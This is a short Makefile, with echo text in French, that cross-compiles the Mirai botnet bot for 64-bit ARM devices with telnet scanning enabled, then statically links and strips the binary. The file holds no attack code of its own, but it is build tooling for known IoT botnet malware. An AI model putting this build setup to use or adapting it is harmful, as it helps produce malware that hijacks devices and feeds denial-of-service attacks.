CC=aarch64-linux-gnu-gcc
CFLAGS=-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static -DMIRAI_BOT_ARCH=\"arm64\" -DMIRAI_TELNET

RELEASE_DIR := $(CURDIR)/release

all: clean mirai

mirai:
	@echo "[*] Compilation de Mirai (bot)..."
	mkdir -p "$(RELEASE_DIR)"
	$(CC) $(CFLAGS) *.c -o "$(RELEASE_DIR)/mirai"
	aarch64-linux-gnu-strip "$(RELEASE_DIR)/mirai"

clean:
	rm -rf "$(RELEASE_DIR)"
